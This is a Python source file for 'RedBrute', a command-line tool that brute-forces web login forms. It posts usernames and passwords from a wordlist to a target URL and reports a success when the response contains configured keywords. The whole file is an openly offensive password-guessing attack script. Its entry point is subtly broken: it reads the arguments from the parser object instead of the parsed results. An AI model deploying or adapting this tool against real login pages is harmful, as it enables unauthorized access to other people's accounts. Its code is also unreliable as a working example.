import requests, json, argparse

class BruteForcer:
    def __init__(self, url, username_field_name: str, password_field_name: str, username: str, password_filename: str):
        self.url = url
        self.username_field_name = username_field_name
        self.password_field_name = password_field_name
        self.username = username
        self.password_filename = password_filename
        self.passwords_list = self.make_password_list_from_file()
    
    def get_settings(self):
        with open("settings.json") as f:
            return json.load(f)
    
    def get_language_json(self, language: str):
        with open(f"languages/{language}.json") as f:
            return json.load(f)
    
    def get_language_dict(self):
        lang = self.get_settings()["language"]
        return self.get_language_json(lang)
    
    def make_password_list_from_file(self) -> list:
        with open(self.password_filename, "r") as f:
            passwords = f.readlines()

        password_list = [password.strip() for password in passwords]
        return password_list
    
    def start_bruteforce(self):
        correct_password = None
        for password in self.passwords_list:
            data = {self.username_field_name: self.username, self.password_field_name: password}
            response = requests.post(self.url, data=data)
            if response.status_code == 404:
                print(self.get_language_dict()["not-found"])
                return correct_password
            valid_password = False
            for word in self.get_settings()["words-on-login"]:
                if word in response.text.lower():
                    valid_password = True
                    correct_password = password

            if valid_password:
                print(self.get_language_dict()["correct-password"].replace("<user>", self.username).replace("<password>", password))
            else:
                print(self.get_language_dict()["invalid-password"].replace("<user>", self.username).replace("<password>", password))
            valid_password = False

            if correct_password != None:
                return correct_password
            
        return correct_password

if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog="RedBrute", usage="python redbrute.py <url> <username-field-name> <password-field-name> <username> <password-filename>")

    parser.add_argument("url")
    parser.add_argument("usernameFieldName")
    parser.add_argument("passwordFieldName")
    parser.add_argument("username")
    parser.add_argument("passwordFileName")

    args = parser.parse_args()

    bf = BruteForcer(parser.url, parser.usernameFieldName, parser.passwordFieldName, parser.username, parser.passwordFileName)
    bf.start_bruteforce()
